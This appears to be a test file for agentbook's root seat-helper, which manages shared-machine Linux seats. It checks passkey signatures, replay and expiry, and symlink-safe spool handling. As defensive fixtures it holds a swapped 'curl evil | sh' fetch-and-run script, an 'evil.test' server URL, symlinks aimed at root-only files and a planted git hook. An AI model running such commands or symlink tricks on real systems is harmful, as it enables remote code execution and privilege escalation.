#!/usr/bin/env node
// The root half of sharing a machine (plugin/cli/seat-helper.ts): the helper that adds and removes people's seats
// for the machine's owner. Here its checks, with stand-ins for what touches the machine (no Linux user is made):
// an add only when the owner's passkey signed it, for this machine, lately, and not after a later change; a remove
// unsigned; never the owner's own seat; a login only into a seat that exists, for the machine's own server; and only
// requests the owner's Linux user wrote. And on a machine agentbook made: an Update's script only as the whole
// command its owner signed, once; and a change of the owner's passkeys, signed like any. As root on Linux, with real
// users: the same, and a machine claimed for its owner as it sets itself up.
// Run: node test/seat-helper.ts

import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { makePasskey, signPayload } from "./fake-passkey.ts";
import type { HelperDeps } from "../plugin/cli/seat-helper.ts";

const BASE = fs.mkdtempSync(path.join(os.tmpdir(), "agentbook-seath-"));
process.env.AGENTBOOK_SEATS_FILE = path.join(BASE, "etc", "seats.json");
process.env.AGENTBOOK_SEATS_SPOOL = path.join(BASE, "spool");
const { askHelper, drain, handle, readBox, sharesHere } = await import("../plugin/cli/seat-helper.ts");
const { MARK, writeSeats, readSeats } = await import("../plugin/cli/seats.ts");

let failures = 0;
const check = (cond: unknown, label: string): void => {
  console.log(`${cond ? "PASS" : "FAIL"}  ${label}`);
  if (!cond) failures++;
};

const FILE = process.env.AGENTBOOK_SEATS_FILE;
const SPOOL = process.env.AGENTBOOK_SEATS_SPOOL;
const origin = "https://app.agentbook.test";
const key = makePasskey(-7, "phone");
const other = makePasskey(-7, "someone else's");
fs.mkdirSync(path.dirname(FILE), { recursive: true });
fs.mkdirSync(SPOOL, { recursive: true });
writeSeats({ machine: "boat-shop", seats: { herval: { uid: process.getuid(), port: 4321, added: new Date().toISOString() } } }, FILE);
const box = () => readBox(FILE);
fs.writeFileSync(path.join(path.dirname(FILE), "box.json"), JSON.stringify({ owner: "herval", machine: "boat-shop", server: "https://app.agentbook.test", keys: [{ id: key.record.id, alg: key.record.alg, spki: key.record.spki }], origin, rp_id: "app.agentbook.test", seen: {} }));

// What touches the machine, stood in: seats in seats.json, homes under BASE.
const did: string[] = [];
const deps: HelperDeps = {
  add(name) {
    const all = readSeats(FILE);
    all.seats[name] = { uid: 2000 + Object.keys(all.seats).length, port: 4321 + Object.keys(all.seats).length, added: new Date().toISOString() };
    writeSeats(all, FILE);
    did.push(`add ${name}`);
    return `Made ${name}'s seat`;
  },
  remove(name) {
    const all = readSeats(FILE);
    delete all.seats[name];
    writeSeats(all, FILE);
    did.push(`remove ${name}`);
  },
  passwd: (name) => ({ name, uid: 2001, gid: 2001, gecos: name === "stranger" ? "" : MARK, home: path.join(BASE, "home", name), shell: "/bin/bash" }),
  putEnroll(pw, text) {
    fs.mkdirSync(pw.home, { recursive: true });
    fs.writeFileSync(path.join(pw.home, ".agentbook-enroll"), text);
    did.push(`enroll ${pw.name}`);
  },
  restart: (name) => did.push(`restart ${name}`),
  setup: (admin, script, owner) => did.push(`setup as ${admin} for ${owner}: ${script}`),
};
const signed = (e, by = key) => ({ kind: "members.change", change: { envelope: e, sig: signPayload(by, e, { origin, rpId: "app.agentbook.test" }) } });
const add = (user, extra = {}) => ({ v: 1, kind: "members.change", machine: "boat-shop", user, at: new Date().toISOString(), ...extra });
const ask = (req) => handle(req, box(), { file: FILE, deps });

check(box()?.owner === "herval" && sharesHere("herval", { file: FILE, spool: SPOOL }) && !sharesHere("banana", { file: FILE, spool: SPOOL }), "a shared machine has an owner, whose seat is the one that asks the helper");

// ---------- adding ----------
const a1 = ask(signed(add("banana")));
check(a1.ok && a1.added && did.join() === "add banana" && readSeats(FILE).seats.banana, "an add its owner's passkey signed makes the seat");
check(/wasn't theirs/.test(ask({ kind: "members.change", change: { envelope: add("carol") } }).error || ""), "one that isn't signed doesn't");
check(/wasn't theirs/.test(ask(signed(add("carol"), other)).error || ""), "nor one signed by someone else's passkey");
const moved = signed(add("carol"));
moved.change.envelope.user = "dave";
check(/wasn't theirs/.test(ask(moved).error || "") && !readSeats(FILE).seats.dave, "nor one signed for another person");
check(/not for boat-shop/.test(ask(signed(add("carol", { machine: "boat-other" }))).error || ""), "nor one signed for another machine");
check(/too long ago/.test(ask(signed(add("carol", { at: new Date(Date.now() - 2 * 86400e3).toISOString() }))).error || "") && /too long ago|hasn't come/.test(ask(signed(add("carol", { at: new Date(Date.now() + 3600e3).toISOString() }))).error || ""), "nor one signed days ago, or for later");
check(/owns this machine/.test(ask(signed(add("herval"))).error || "") && /owns this machine/.test(ask({ kind: "members.change", change: { envelope: add("herval", { remove: true }) } }).error || ""), "the owner's own seat is never added or removed this way");
check(/can't be a Linux user's name/.test(ask(signed(add("../etc"))).error || "") && /can't be a Linux user's name|has for itself/.test(ask(signed(add("root"))).error || ""), "a name that can't be a seat's is turned down");
check(did.join() === "add banana", "none of those touched the machine");

// ---------- removing, and an old add that arrives after ----------
const old = signed(add("carol", { at: new Date(Date.now() - 60e3).toISOString() }));
check(ask(signed(add("carol", { at: new Date(Date.now() - 120e3).toISOString() }))).ok, "carol is added");
const r1 = ask({ kind: "members.change", change: { envelope: add("carol", { remove: true }) } });
check(r1.ok && r1.removed && !readSeats(FILE).seats.carol, "taking someone off needs no signature");
check(/later change/.test(ask(old).error || "") && !readSeats(FILE).seats.carol, "an add signed before that, arriving after it, doesn't put them back");
check(ask(signed(add("carol"))).ok && readSeats(FILE).seats.carol, "a new one its owner signs now does");
check(ask({ kind: "members.change", change: { envelope: add("zed", { remove: true }) } }).removed === false, "taking off someone who isn't on it does nothing");

// ---------- a member's login ----------
const e1 = ask({ kind: "members.enroll", user: "banana", enroll: { server: "https://evil.test", name: "boat-shop-banana", poll: "p-123" } });
const file = path.join(BASE, "home", "banana", ".agentbook-enroll");
const put = fs.existsSync(file) ? JSON.parse(fs.readFileSync(file, "utf8")) : {};
check(e1.ok && put.poll === "p-123" && put.name === "boat-shop-banana" && did.includes("restart banana"), "a login for a member goes into their seat's home, and their agentbook-cli starts again to take it");
check(put.server === "https://app.agentbook.test", "for this machine's own server, whatever the request names");
check(/no seat here/.test(ask({ kind: "members.enroll", user: "zed", enroll: { poll: "p" } }).error || "") && /owns this machine/.test(ask({ kind: "members.enroll", user: "herval", enroll: { poll: "p" } }).error || ""), "only into a seat that exists, and never the owner's");
check(/Nothing else/.test(ask({ kind: "run", cmd: "id" }).error || ""), "the helper does nothing else");

// ---------- the spool ----------
fs.writeFileSync(path.join(SPOOL, "one.json"), JSON.stringify({ kind: "members.change", change: { envelope: add("carol", { remove: true }) } }));
fs.symlinkSync(path.join(SPOOL, "one.json"), path.join(SPOOL, "link.json"));
check(drain({ file: FILE, spool: SPOOL, deps, ownerUid: process.getuid() + 1 }) === 2 && readSeats(FILE).seats.carol && /isn't a request of this machine's owner/.test(JSON.parse(fs.readFileSync(path.join(SPOOL, "one.out"), "utf8")).error), "a request another Linux user wrote, or a link, is refused");
for (const f of fs.readdirSync(SPOOL)) fs.rmSync(path.join(SPOOL, f));
// The spool is its owner's to write, and the helper is root: nothing in it is followed.
const victim = path.join(BASE, "roots-file");
fs.writeFileSync(victim, "root-only-contents");
fs.writeFileSync(path.join(SPOOL, "two.json"), JSON.stringify({ kind: "members.change", change: { envelope: add("zed", { remove: true }) } }));
fs.symlinkSync(victim, path.join(SPOOL, "two.out"));
fs.symlinkSync(victim, path.join(SPOOL, "peek.json"));
drain({ file: FILE, spool: SPOOL, deps, ownerUid: process.getuid() });
check(fs.readFileSync(victim, "utf8") === "root-only-contents" && !fs.lstatSync(path.join(SPOOL, "two.out")).isSymbolicLink() && JSON.parse(fs.readFileSync(path.join(SPOOL, "two.out"), "utf8")).ok === true, "an answer is never written through a link left where it goes: the link is replaced, and what it pointed at is untouched");
check(!fs.readFileSync(path.join(SPOOL, "peek.out"), "utf8").includes("root-only") && /isn't a request/.test(fs.readFileSync(path.join(SPOOL, "peek.out"), "utf8")), "and a request that's a link to another file is neither read nor quoted back");
for (const f of fs.readdirSync(SPOOL)) fs.rmSync(path.join(SPOOL, f));
const waiting = askHelper({ kind: "members.change", change: { envelope: add("carol", { remove: true }) } }, { spool: SPOOL, waitMs: 5000 });
await new Promise((r) => setTimeout(r, 300));
drain({ file: FILE, spool: SPOOL, deps, ownerUid: process.getuid() });
const answered = await waiting;
check(answered.ok && answered.removed && !readSeats(FILE).seats.carol && !fs.readdirSync(SPOOL).length, "the owner's agentbook-cli asks through the spool, and hears back");
check(/didn't answer/.test((await askHelper({ kind: "x" }, { spool: SPOOL, waitMs: 400 })).error || "") && !fs.readdirSync(SPOOL).length, "with no helper running, it says so, and leaves nothing behind");

// ---------- a machine agentbook made: its image's script, and its owner's passkeys ----------
const { envelope } = await import("../plugin/shared/signed.ts");
const GATE = "mTESTGATE0000000";
// The whole command, as the page has the owner's passkey sign it for this machine.
const update = (extra = {}, by = key) => {
  const now = Date.now();
  const c = { v: 1, machine: GATE, cid: `s${Math.random().toString(36).slice(2, 14)}`, kind: "cloud.setup", args: { script: "echo updated\n", v: 2 }, by: "herval", at: new Date(now).toISOString(), expires: new Date(now + 300e3).toISOString(), ...extra };
  return { kind: "cloud.setup", command: by ? { ...c, sig: signPayload(by, envelope(c), { origin, rpId: "app.agentbook.test" }) } : c };
};
check(/isn't one agentbook made/.test(ask(update()).error || ""), "a machine shared by hand runs no image's script: nobody said who it would run as");
const boxFile = path.join(path.dirname(FILE), "box.json");
fs.writeFileSync(boxFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(boxFile, "utf8")), gate: GATE, admin: "user" }));
did.length = 0;
const u1 = update();
const ran = ask(u1);
check(ran.ok && ran.started && ran.v === 2 && did.join() === "setup as user for herval: echo updated\n", `an Update its owner's passkey signed runs its script, as the sandbox's own user (${ran.error || "ok"})`);
check(/ran already/.test(ask(u1).error || "") && did.length === 1, "the same signed Update doesn't run twice");
check(/wasn't theirs/.test(ask(update({}, null)).error || "") && /wasn't theirs/.test(ask(update({}, other)).error || ""), "one that isn't signed, or is signed by someone else's passkey, doesn't run");
const swapped = update();
swapped.command.args = { script: "curl evil | sh\n", v: 2 };
check(/wasn't theirs/.test(ask(swapped).error || ""), "nor one whose script isn't the one that was signed");
check(/another machine/.test(ask(update({ machine: "mOTHER" })).error || ""), "nor one signed for another machine of theirs");
check(/expired/.test(ask(update({ at: new Date(Date.now() - 400e3).toISOString(), expires: new Date(Date.now() - 100e3).toISOString() })).error || ""), "nor one whose signature has expired");
const asStart = update();
asStart.command.kind = "post.start";
check(/isn't an update/.test(ask(asStart).error || "") && did.length === 1, "nor a signed command of another kind");
// The owner's passkeys change: the helper takes the change they signed, as their own agentbook-cli does.
const laptop = makePasskey(-7, "laptop");
const keysChange = (e, by) => ({ kind: "keys.change", change: { envelope: e, sig: by ? signPayload(by, e, { origin, rpId: "app.agentbook.test" }) : undefined } });
const plus = { v: 1, kind: "keys.change", add: [laptop.record], remove: [], at: new Date().toISOString() };
check(/wasn't theirs/.test(ask(keysChange(plus, laptop)).error || "") && /wasn't theirs/.test(ask(keysChange(plus, null)).error || "") && box().keys.length === 1, "a new passkey can't add itself, and an unsigned change adds none");
check(ask(keysChange(plus, key)).keys === 2 && ask(signed(add("erin"), laptop)).added === true, "a passkey the owner added, signed with one the helper keeps, signs from then on");
check(/older than the last change/.test(ask(keysChange(plus, key)).error || ""), "the same change doesn't count twice");
const minus = { v: 1, kind: "keys.change", add: [], remove: [key.record.id], at: new Date(Date.now() + 1000).toISOString() };
check(ask(keysChange(minus, laptop)).keys === 1 && /wasn't theirs/.test(ask(signed(add("frank"))).error || "") && !readSeats(FILE).seats.frank, "and one they took off signs nothing more here");

// ---------- for real: Linux, as root, where only root can change agentbook's code ----------
const { spawnSync } = await import("node:child_process");
const { fileURLToPath } = await import("node:url");
const { unsafeCode } = await import("../plugin/cli/seats.ts");
const PLUGIN = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "plugin");
if (process.platform !== "linux" || process.getuid() !== 0) console.log("skip the real helper: it needs Linux and root (sudo node test/seat-helper.ts)");
else {
  // agentbook's code and the Node it runs on, where only root can change them, as on a real shared machine.
  const code = fs.mkdtempSync("/tmp/agentbook-seat-code-");
  fs.chmodSync(code, 0o755);
  spawnSync("cp", ["-a", PLUGIN, path.join(code, "plugin")]);
  spawnSync("cp", [process.execPath, path.join(code, "node")]);
  spawnSync("chown", ["-R", "root:root", code]);
  spawnSync("chmod", ["-R", "go-w", code]);
  fs.mkdirSync(path.join(code, "systemd"));
  check(!unsafeCode(path.join(code, "plugin")) && !unsafeCode(path.join(code, "node")), "agentbook's code is put where only root can change it");
  const env = { ...process.env, AGENTBOOK_SYSTEMD_DIR: path.join(code, "systemd") };
  for (const k of ["AGENTBOOK_SEATS_FILE", "AGENTBOOK_SEATS_SPOOL"]) delete env[k];
  const cli = (...args) => spawnSync(path.join(code, "node"), [path.join(code, "plugin", "cli", "main.mjs"), "seat", ...args, ...(args[0] === "share" ? ["--no-start"] : [])], { env, encoding: "utf8" });
  const pw = (name) => (spawnSync("getent", ["passwd", name], { encoding: "utf8" }).stdout || "").trim().split(":");
  const A = "abseatown";
  const B = "abseatmem";
  const spool = "/var/lib/agentbook/spool";
  // Only what this made: a machine that's shared for real keeps its own.
  const had = fs.existsSync("/etc/agentbook/box.json") || fs.existsSync("/etc/agentbook/seats.json");
  const hadWork = fs.existsSync("/work");
  const cleanup = () => {
    if (had) return;
    for (const n of [B, A]) cli("remove", n);
    fs.rmSync("/etc/agentbook/box.json", { force: true });
    fs.rmSync("/etc/agentbook/seats.json", { force: true });
    fs.rmSync(spool, { recursive: true, force: true });
    fs.rmSync("/etc/agentbook/seats.env", { force: true });
    fs.rmSync("/etc/agentbook/admin", { force: true });
    if (!hadWork) fs.rmSync("/work", { recursive: true, force: true });
    spawnSync("groupdel", ["agentbook-work"]);
  };
  if (had) console.log("skip the real helper: this machine has seats of its own, which this would change");
  else
  try {
    const added = cli("add", A, "--machine", "boat-shop", "--no-start");
    check(added.status === 0 && pw(A)[0] === A, `root makes the owner's seat (${(added.stderr || added.stdout).trim().split("\n")[0]})`);
    const [, , uidA, gidA, , homeA] = pw(A);
    check(/keeps none of their passkeys/.test(cli("share", A).stderr || cli("share", A).stdout), "a machine whose owner's agentbook-cli keeps no passkeys can't be shared: nothing could prove an add is theirs");
    fs.mkdirSync(path.join(homeA, ".agentbook", "cli"), { recursive: true });
    fs.writeFileSync(path.join(homeA, ".agentbook", "cli", "gate.json"), JSON.stringify({ keys: [key.record], origin, rp_id: "app.agentbook.test" }));
    fs.writeFileSync(path.join(homeA, ".agentbook", "cli", "device.json"), JSON.stringify({ server: "https://app.agentbook.test", token: "t", name: "boat-shop" }));
    spawnSync("chown", ["-R", `${uidA}:${gidA}`, path.join(homeA, ".agentbook")]);
    const shared = cli("share", A);
    const st = fs.existsSync(spool) ? fs.statSync(spool) : null;
    check(shared.status === 0 && st?.uid === Number(uidA) && (st.mode & 0o777) === 0o700 && fs.statSync("/etc/agentbook/box.json").uid === 0, `shared, as theirs: the spool is theirs alone to write, and what proves an add is root's (${(shared.stderr || shared.stdout).trim().split("\n")[0]})`);
    // The owner's Linux user drops a request, as their agentbook-cli would.
    const drop = (name, req, uid = uidA, gid = gidA) => spawnSync(process.execPath, ["-e", `require("fs").writeFileSync(${JSON.stringify(path.join(spool, name))}, ${JSON.stringify(JSON.stringify(req))})`], { uid: Number(uid), gid: Number(gid), encoding: "utf8" });
    const answer = (name) => {
      try {
        return JSON.parse(fs.readFileSync(path.join(spool, name.replace(/\.json$/, ".out")), "utf8"));
      } catch {
        return null;
      }
    };
    const d1 = drop("a1.json", { kind: "members.change", change: { envelope: add(B) } });
    check(d1.status === 0, `the owner's Linux user can drop a request in the spool (${d1.stderr.trim().split("\n").at(-1) || "ok"})`);
    cli("serve", "--once");
    check(/wasn't theirs/.test(answer("a1.json")?.error || "") && !pw(B)[0], "an unsigned add makes no Linux user");
    drop("a2.json", signed(add(B)));
    const served = cli("serve", "--once");
    check(answer("a2.json")?.added === true && pw(B)[0] === B, `a signed one does (${JSON.stringify(answer("a2.json"))} ${served.stderr.trim().split("\n")[0]})`);
    const [, , uidB = "65534", gidB = "65534", , homeB = "/nonexistent"] = pw(B);
    check(fs.existsSync(homeB) && (fs.statSync(homeB).mode & 0o777) === 0o700 && !spawnSync("id", ["-nG", B], { encoding: "utf8" }).stdout.split(/\s+/).some((g) => ["sudo", "docker", "root"].includes(g)), "the member's home is theirs alone, and they're in no group that amounts to root");
    // ---------- the code everyone shares ----------
    const as = (uid, gid, home, cmd) => spawnSync("/bin/sh", ["-c", `umask 002; ${cmd}`], { uid: Number(uid), gid: Number(gid), cwd: "/work", env: { HOME: home, PATH: "/usr/local/bin:/usr/bin:/bin", GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@example.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@example.com" }, encoding: "utf8" });
    const groups = (n) => spawnSync("id", ["-nG", n], { encoding: "utf8" }).stdout.trim().split(/\s+/);
    const ws = fs.existsSync("/work") ? fs.statSync("/work") : null;
    check(ws?.isDirectory() && (ws.mode & 0o7777) === 0o2775 && groups(A).includes("agentbook-work") && groups(B).includes("agentbook-work"), "sharing makes /work, a folder of a group both of them are in, that passes the group on");
    // (Each runs with the groups their agentbook-cli has under systemd: their own, and /work's.)
    const gid = (spawnSync("getent", ["group", "agentbook-work"], { encoding: "utf8" }).stdout || "").split(":")[2];
    const inWork = (uid, home, cmd) => spawnSync("/bin/sh", ["-c", `umask 002; ${cmd}`], { uid: Number(uid), gid: Number(gid), cwd: "/work", env: { HOME: home, PATH: "/usr/local/bin:/usr/bin:/bin", GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@example.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@example.com" }, encoding: "utf8" });
    const made = inWork(uidA, homeA, "git init -q -b main shop && cd shop && echo one > a.txt && git add a.txt && git commit -q -m one && printf '#!/bin/sh\\ntouch /tmp/agentbook-hook-ran\\n' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit");
    check(made.status === 0, `the owner makes a repo there (${made.stderr.trim().split("\n").at(-1) || "ok"})`);
    fs.rmSync("/tmp/agentbook-hook-ran", { force: true });
    const theirs = inWork(uidB, homeB, "cd shop && git status --short && echo two >> a.txt && echo new > b.txt && git add -A && git commit -q -m two && git log --oneline | wc -l");
    check(theirs.status === 0 && theirs.stdout.trim().endsWith("2"), `the member's git takes it as theirs to work in, and commits there (${theirs.stderr.trim().split("\n").at(-1) || "ok"})`);
    check(!fs.existsSync("/tmp/agentbook-hook-ran"), "and a hook the owner left in the repo doesn't run as the member");
    const back = inWork(uidA, homeA, "cd shop && echo three >> b.txt && git add -A && git commit -q -m three && git log --oneline | wc -l");
    check(back.status === 0 && back.stdout.trim().endsWith("3"), `what the member made, the owner can change (${back.stderr.trim().split("\n").at(-1) || "ok"})`);
    check(spawnSync("/bin/sh", ["-c", `ls ${homeA}`], { uid: Number(uidB), gid: Number(gidB) }).status !== 0, "while each one's home stays theirs alone");
    void as;
    // The owner can't use the helper to write or read as root.
    fs.writeFileSync("/etc/agentbook/victim", "roots\n", { mode: 0o600 });
    const link = (name) => spawnSync("ln", ["-s", "/etc/agentbook/victim", path.join(spool, name)], { uid: Number(uidA), gid: Number(gidA) });
    link("v1.out");
    link("v2.json");
    drop("v1.json", { kind: "members.change", change: { envelope: add("abseatnone", { remove: true }) } });
    cli("serve", "--once");
    const peeked = spawnSync("cat", [path.join(spool, "v2.out")], { uid: Number(uidA), gid: Number(gidA), encoding: "utf8" }).stdout;
    check(fs.readFileSync("/etc/agentbook/victim", "utf8") === "roots\n" && answer("v1.json")?.ok === true && !peeked.includes("roots"), "a link the owner leaves in the spool isn't written through or read by root");
    fs.rmSync("/etc/agentbook/victim", { force: true });
    const sneak = drop("b1.json", { kind: "members.change", change: { envelope: add("abseatevil") } }, uidB, gidB);
    check(sneak.status !== 0 && /EACCES/.test(sneak.stderr), "a member can't ask the helper for anything: the spool isn't theirs to write");
    drop("e1.json", { kind: "members.enroll", user: B, enroll: { server: "https://evil.test", name: "boat-shop-mem", poll: "p-xyz" } });
    cli("serve", "--once");
    const ef = path.join(homeB, ".agentbook-enroll");
    const es = fs.existsSync(ef) ? fs.statSync(ef) : null;
    check(answer("e1.json")?.enrolled === true && es?.uid === Number(uidB) && (es.mode & 0o777) === 0o600 && JSON.parse(fs.readFileSync(ef, "utf8")).server === "https://app.agentbook.test", "a member's login lands in their home, theirs alone to read, for the machine's own server");
    drop("r1.json", { kind: "members.change", change: { envelope: add(B, { remove: true }) } });
    cli("serve", "--once");
    check(answer("r1.json")?.removed === true && !pw(B)[0] && !fs.existsSync(homeB), "taken off, their Linux user and home are gone");
    drop("r2.json", { kind: "members.change", change: { envelope: add(A, { remove: true }) } });
    cli("serve", "--once");
    check(/owns this machine/.test(answer("r2.json")?.error || "") && pw(A)[0] === A, "the owner's own seat can't be removed through it");

    // ---------- a machine agentbook made, claimed for its owner as it sets itself up ----------
    cleanup();
    const ADM = "abseatadm";
    spawnSync("useradd", ["--create-home", "--shell", "/bin/bash", ADM]);
    const [, , uidM, gidM, , homeM] = pw(ADM);
    const login = (pin) => {
      const f = path.join(homeM, ".agentbook-enroll");
      fs.writeFileSync(f, JSON.stringify({ server: "https://app.agentbook.test/", name: "boat-shop", poll: "p-123", ...(pin ? { pin } : {}) }), { mode: 0o600 });
      fs.chownSync(f, Number(uidM), Number(gidM));
      return f;
    };
    const claim = (f) => cli("claim", A, "--machine", "boat-shop", "--enroll", f, "--admin", ADM, "--no-start");
    const bare = claim(login(null));
    const [, , uidO, gidO, , homeO] = pw(A);
    const landed = () => (fs.existsSync(path.join(homeO, ".agentbook-enroll")) ? fs.statSync(path.join(homeO, ".agentbook-enroll")) : null);
    check(bare.status === 0 && pw(A)[0] === A && landed()?.uid === Number(uidO) && (landed().mode & 0o777) === 0o600 && !fs.existsSync(path.join(homeM, ".agentbook-enroll")), `claimed: the owner has a seat, and the machine's login moved into its home, theirs alone (${(bare.stderr || bare.stdout).trim().split("\n")[0]})`);
    check(!fs.existsSync("/etc/agentbook/box.json") && /none of abseatown's passkeys/.test(bare.stdout) && fs.readFileSync("/etc/agentbook/admin", "utf8").trim() === ADM, "a login that came with no passkeys leaves the machine unshared, and says so");
    const claimed = claim(login({ keys: [key.record], origin, rp_id: "app.agentbook.test" }));
    const bx = fs.existsSync("/etc/agentbook/box.json") ? JSON.parse(fs.readFileSync("/etc/agentbook/box.json", "utf8")) : {};
    check(claimed.status === 0 && bx.owner === A && bx.keys?.[0]?.id === key.record.id && bx.server === "https://app.agentbook.test" && bx.admin === ADM && /^m[\w-]{16}$/.test(bx.gate || "") && fs.statSync("/etc/agentbook/box.json").uid === 0, `with the owner's passkeys in it, root writes them down before anything of theirs runs: it's shared from the start (${(claimed.stderr || claimed.stdout).trim().split("\n").at(-1)})`);
    const gf = path.join(homeO, ".agentbook", "cli", "gate.json");
    check(fs.existsSync(gf) && fs.statSync(gf).uid === Number(uidO) && JSON.parse(fs.readFileSync(gf, "utf8")).machine === bx.gate, "and the seat's agentbook-cli starts with the id its owner's commands will be signed for");
    const sp = fs.existsSync(spool) ? fs.statSync(spool) : null;
    check(sp?.uid === Number(uidO) && (sp.mode & 0o777) === 0o700 && (fs.statSync("/work").mode & 0o7777) === 0o2775 && groups(A).includes("agentbook-work") && /AGENTBOOK_CLONE_DIR=\/work/.test(fs.readFileSync("/etc/agentbook/seats.env", "utf8")), "with the spool, /work and the owner's place in it, as on a machine shared by hand");
    // Where the image's tools are, for every seat's PATH.
    fs.mkdirSync("/opt/abseat-tools/bin", { recursive: true });
    fs.writeFileSync("/etc/agentbook/tools.path", "/opt/abseat-tools/bin:relative/bin:/has space/bin:/opt/../etc\n", { mode: 0o644 });
    const fresh = cli("refresh");
    const envA = fs.readFileSync(`/etc/agentbook/seats/${A}.env`, "utf8");
    check(fresh.status === 0 && new RegExp(`^PATH=${homeO}/\\.local/bin:${homeO}/\\.cargo/bin:/opt/abseat-tools/bin:`, "m").test(envA) && !/relative|has space|\.\./.test(envA), `seat refresh puts the machine's tools on every seat's PATH, whole paths only (${(fresh.stderr || fresh.stdout).trim().split("\n")[0]})`);
    // Nobody there has sudo: what a person's agents install goes into their own home.
    const seatEnv = Object.fromEntries(envA.split("\n").filter(Boolean).map((l) => [l.slice(0, l.indexOf("=")), l.slice(l.indexOf("=") + 1)]));
    const npmTo = spawnSync("npm", ["prefix", "-g"], { uid: Number(uidO), gid: Number(gidO), cwd: homeO, env: { HOME: homeO, ...seatEnv, PATH: `${seatEnv.PATH}:${path.dirname(process.execPath)}` }, encoding: "utf8" });
    check(npmTo.stdout.trim() === `${homeO}/.local` && seatEnv.GOBIN === `${homeO}/.local/bin` && seatEnv.CARGO_HOME === `${homeO}/.cargo` && seatEnv.PATH.startsWith(`${homeO}/.local/bin:${homeO}/.cargo/bin:`), `in a seat, npm install -g goes to the person's own home, whose bin is first on their PATH (${npmTo.stdout.trim() || npmTo.stderr.trim().split("\n")[0]})`);
    fs.chmodSync("/etc/agentbook/tools.path", 0o666);
    cli("refresh");
    check(!/abseat-tools/.test(fs.readFileSync(`/etc/agentbook/seats/${A}.env`, "utf8")), "a tools list others than root could change counts for nothing");
    fs.rmSync("/etc/agentbook/tools.path", { force: true });
    fs.rmSync("/opt/abseat-tools", { recursive: true, force: true });
    // An Update: the helper runs the script its owner signed, as the sandbox's own user.
    const cmd = (script, by = key) => {
      const now = Date.now();
      const c = { v: 1, machine: bx.gate, cid: `s${Math.random().toString(36).slice(2, 14)}`, kind: "cloud.setup", args: { script, v: 3 }, by: "herval", at: new Date(now).toISOString(), expires: new Date(now + 300e3).toISOString() };
      return { kind: "cloud.setup", command: by ? { ...c, sig: signPayload(by, envelope(c), { origin, rpId: "app.agentbook.test" }) } : c };
    };
    const slog = "/var/lib/agentbook/setup.log";
    drop("u0.json", cmd('id -un > "$AGENTBOOK_BUILD_LOG"\n', null), uidO, gidO);
    cli("serve", "--once");
    check(/wasn't theirs/.test(answer("u0.json")?.error || "") && !fs.existsSync(slog), "an Update that isn't signed runs nothing");
    drop("u1.json", cmd('#!/bin/bash\necho "::step as $(id -un) in $HOME" > "$AGENTBOOK_BUILD_LOG"\necho "::end ok 1" >> "$AGENTBOOK_BUILD_LOG"\n'), uidO, gidO);
    cli("serve", "--once");
    for (let i = 0; i < 40 && !/::end ok/.test(fs.existsSync(slog) ? fs.readFileSync(slog, "utf8") : ""); i++) spawnSync("sleep", ["0.1"]);
    const ls = fs.existsSync(slog) ? fs.statSync(slog) : null;
    check(answer("u1.json")?.started === true && new RegExp(`::step as ${ADM} in ${homeM}`).test(fs.readFileSync(slog, "utf8")), `a signed one runs its script as the sandbox's own user, never as root or the seat (${JSON.stringify(answer("u1.json"))})`);
    check(ls?.uid === Number(uidM) && ls.gid === Number(gidO) && (ls.mode & 0o777) === 0o640 && spawnSync("cat", [slog], { uid: Number(uidO), gid: Number(gidO) }).status === 0 && spawnSync("cat", [slog], { uid: 65534, gid: 65534 }).status !== 0, "how it went is the owner's seat's to read, and nobody else's");
    spawnSync("userdel", ["--remove", ADM]);
    fs.rmSync("/var/lib/agentbook/setup.sh", { force: true });
    fs.rmSync(slog, { force: true });
  } finally {
    spawnSync("userdel", ["--remove", "abseatadm"]);
    cleanup();
    fs.rmSync(code, { recursive: true, force: true });
  }
}

console.log(failures ? `\n${failures} check(s) failed` : "\nAll checks passed");
process.exit(failures ? 1 : 0);
